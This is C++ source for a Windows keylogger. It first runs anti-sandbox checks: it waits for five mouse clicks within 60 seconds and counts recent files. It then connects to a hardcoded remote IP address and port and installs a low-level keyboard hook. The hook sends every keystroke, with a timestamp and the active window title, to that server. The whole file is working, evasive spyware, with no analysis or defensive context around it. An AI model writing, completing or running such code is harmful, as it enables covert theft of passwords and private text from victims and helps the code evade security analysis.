#define _WINSOCK_DEPRECATED_NO_WARNINGS
#define _CRT_SECURE_NO_WARNINGS
#define _WINSOCKAPI_    // Prevent inclusion of winsock.h in windows.h

#include <winsock2.h>
#include <Windows.h>
#include <winhttp.h>
#include <winternl.h>
#include <shellscalingapi.h>
#include <shlobj.h>

// System Headers
#include <iphlpapi.h>
#include <setupapi.h>
#include <devguid.h>
#include <TlHelp32.h>
#include <psapi.h>

// Standard C/C++ Headers
#include <stdio.h>
#include <stdlib.h>
#include <iostream>
#include <string>
#include <sstream>
#include <vector>
#include <cstring>
#include <cstdint>
#include <time.h>
#include <io.h>
#include <strsafe.h>
#include <iomanip>

// Library Links
#pragma comment(lib, "ws2_32.lib")
#pragma comment(lib, "Shcore.lib")
#pragma comment(lib, "setupapi.lib")
#pragma comment(lib, "ntdll.lib")
#pragma comment(lib, "user32.lib")
#pragma comment(lib, "iphlpapi.lib")
#pragma comment(lib, "advapi32.lib")
#pragma comment(lib, "winhttp.lib")
#pragma comment(lib, "Shell32.lib")
#pragma comment(lib, "Ole32.lib")

using namespace std;

HHOOK hKeyHook;
SOCKET WSock;

DWORD g_dwMouseClicks = 0x00;
HHOOK g_hMouseHook = 0x00;
DWORD g_dwLastPrintTime = 0;
LRESULT CALLBACK HookProc(int nCode, WPARAM wParam, LPARAM lParam)
{
    if (wParam == WM_LBUTTONDOWN || wParam == WM_RBUTTONDOWN || wParam == WM_MBUTTONDOWN)
    {
        g_dwMouseClicks++;
        printf("Mouse clicks: %d\n", g_dwMouseClicks);

        if (g_dwMouseClicks >= 5)
        {

            UnhookWindowsHookEx(g_hMouseHook);
            PostQuitMessage(0); 
        }
    }

    return CallNextHookEx(g_hMouseHook, nCode, wParam, lParam);
}

BOOL IsVirtualEnvUserInteraction(IN DWORD dwMonitorTimeInSec, IN OPTIONAL DWORD dwNmbrOfMouseClicks)
{
    DWORD dwMouseClicks = 5; 

    if (!dwMonitorTimeInSec)
        return true;

    if (dwNmbrOfMouseClicks && dwNmbrOfMouseClicks > 1)
        dwMouseClicks = dwNmbrOfMouseClicks;

    g_dwMouseClicks = 0;

    if (!(g_hMouseHook = SetWindowsHookExW(WH_MOUSE_LL, (HOOKPROC)HookProc, NULL, 0)))
    {
        printf("[!] SetWindowsHookExW Failed With Error: %d \n", GetLastError());
        return false;
    }

    MSG Msg;
    DWORD startTime = GetTickCount();
    while (GetTickCount() - startTime <= dwMonitorTimeInSec * 1000)
    {
        if (PeekMessage(&Msg, NULL, 0, 0, PM_REMOVE))
        {
            TranslateMessage(&Msg);
            DispatchMessage(&Msg);
        }

        if (g_dwMouseClicks >= dwMouseClicks)
        {
            UnhookWindowsHookEx(g_hMouseHook);
            return true; 
        }
    }

    UnhookWindowsHookEx(g_hMouseHook);
    return false; 
}




bool CheckRecentFiles()
{
    PWSTR recentFolder = NULL;
    SHGetKnownFolderPath(FOLDERID_Recent, 0, NULL, &recentFolder);
    wchar_t recentFolderFiles[MAX_PATH + 1] = L"";
    StringCbCatW(recentFolderFiles, MAX_PATH, recentFolder);
    StringCbCatW(recentFolderFiles, MAX_PATH, L"\\*");
    int numberOfRecentFiles = 0;
    WIN32_FIND_DATAW findFileData;
    HANDLE hFind = FindFirstFileW(recentFolderFiles, &findFileData);
    if (hFind != INVALID_HANDLE_VALUE)
    {
        do
        {
            numberOfRecentFiles++;
        } while (FindNextFileW(hFind, &findFileData));
        FindClose(hFind);
    }
    CoTaskMemFree(recentFolder);
    if (numberOfRecentFiles >= 2)
        numberOfRecentFiles -= 2; 
    return numberOfRecentFiles >= 20;
}

std::string getTimeStamp() {
    time_t now = time(nullptr);
    tm* ltm = localtime(&now);
    std::stringstream ss;
    ss << "[" << std::setfill('0') << std::setw(2) << ltm->tm_hour << ":"
       << std::setfill('0') << std::setw(2) << ltm->tm_min << ":"
       << std::setfill('0') << std::setw(2) << ltm->tm_sec << "] ";
    return ss.str();
}

std::string getWindowTitleUTF8() {
    wchar_t wTitle[256] = {0};
    char utf8Title[1024] = {0};
    
    GetWindowTextW(GetForegroundWindow(), wTitle, 256);
    WideCharToMultiByte(CP_UTF8, 0, wTitle, -1, utf8Title, sizeof(utf8Title), NULL, NULL);
    
    return std::string(utf8Title);
}

LRESULT CALLBACK KeyboardHook(int nCode, WPARAM wParam, LPARAM lParam) {
    if (nCode >= 0) {
        KBDLLHOOKSTRUCT *kbdStruct = (KBDLLHOOKSTRUCT*)lParam;
        std::stringstream keyLog;
        
        if (wParam == WM_KEYDOWN || wParam == WM_SYSKEYDOWN) {
            std::string specialKey;
            
            // Handle special keys
            switch (kbdStruct->vkCode) {
                case VK_RETURN: specialKey = "[ENTER]"; break;
                case VK_BACK: specialKey = "[BACKSPACE]"; break;
                case VK_TAB: specialKey = "[TAB]"; break;
                case VK_SHIFT: specialKey = "[SHIFT]"; break;
                case VK_CONTROL: specialKey = "[CTRL]"; break;
                case VK_MENU: specialKey = "[ALT]"; break;
                case VK_CAPITAL: specialKey = "[CAPS LOCK]"; break;
                case VK_ESCAPE: specialKey = "[ESC]"; break;
                case VK_SPACE: specialKey = "[SPACE]"; break;
                case VK_DELETE: specialKey = "[DEL]"; break;
                case VK_LEFT: specialKey = "[LEFT]"; break;
                case VK_RIGHT: specialKey = "[RIGHT]"; break;
                case VK_UP: specialKey = "[UP]"; break;
                case VK_DOWN: specialKey = "[DOWN]"; break;
                default: {
                    wchar_t keyNameW[64] = {0};
                    char utf8Output[256] = {0};
                    int msg = 1 + (kbdStruct->scanCode << 16) + (kbdStruct->flags << 24);
                    GetKeyNameTextW(msg, keyNameW, 64);
                    WideCharToMultiByte(CP_UTF8, 0, keyNameW, -1, utf8Output, sizeof(utf8Output), NULL, NULL);
                    specialKey = utf8Output;
                }
            }

            keyLog << getTimeStamp() 
                << "[" << getWindowTitleUTF8() << "] "
                << "Key: " << specialKey << " "
                << "VK: 0x" << std::hex << kbdStruct->vkCode << "\n";

                  
            std::string logData = keyLog.str();
            send(WSock, logData.c_str(), logData.length(), 0);
        }
    }
    return CallNextHookEx(hKeyHook, nCode, wParam, lParam);
}

bool isSafeEnvironment()
{
    return IsVirtualEnvUserInteraction(60, 5) && CheckRecentFiles();
}

int main() {

    if (!isSafeEnvironment())
    {
        Sleep(15000);
        return 1;
    }
    // Initialize Winsock
    WSADATA wsaData;
    WSAStartup(MAKEWORD(2, 2), &wsaData);

    // Create socket and connect
    WSock = WSASocket(AF_INET, SOCK_STREAM, IPPROTO_TCP, nullptr, 0, 0);
    
    struct sockaddr_in server;
    server.sin_family = AF_INET;
    server.sin_port = htons(6126);  
    server.sin_addr.s_addr = inet_addr("3.85.20.60");

    if (WSAConnect(WSock, (SOCKADDR*)&server, sizeof(server), nullptr, nullptr, nullptr, nullptr) == 0) {
        // Install keyboard hook
        hKeyHook = SetWindowsHookExA(WH_KEYBOARD_LL, KeyboardHook, GetModuleHandle(NULL), 0);
        
        MSG msg;
        while (GetMessageA(&msg, NULL, 0, 0)) {
            TranslateMessage(&msg);
            DispatchMessage(&msg);
        }
    }

    // Cleanup
    UnhookWindowsHookEx(hKeyHook);
    closesocket(WSock);
    WSACleanup();
    
    return 0;
}